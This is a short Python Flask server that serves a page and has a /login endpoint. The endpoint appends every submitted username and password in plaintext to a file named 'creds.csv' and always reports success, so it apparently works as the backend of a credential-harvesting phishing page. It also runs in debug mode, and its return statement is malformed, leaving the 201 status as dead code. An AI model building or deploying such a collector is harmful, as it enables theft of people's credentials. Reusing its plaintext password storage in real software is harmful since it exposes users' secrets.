import csv
from flask import Flask,redirect,url_for,request,render_template,jsonify
app=Flask(__name__)
@app.route("/")
def index():
    return render_template("/index.html")

@app.route("/login",methods=["POST"])
def login():
    username=request.json.get("username")
    password=request.json.get("password")
    with open("creds.csv","a+")as f:
        csvwriter=csv.writer(f)
        csvwriter.writerow([username,password])
    return jsonify({
        "status":"success",
        
    }),
    201
    





if __name__=="__main__":
    app.run(debug=True)
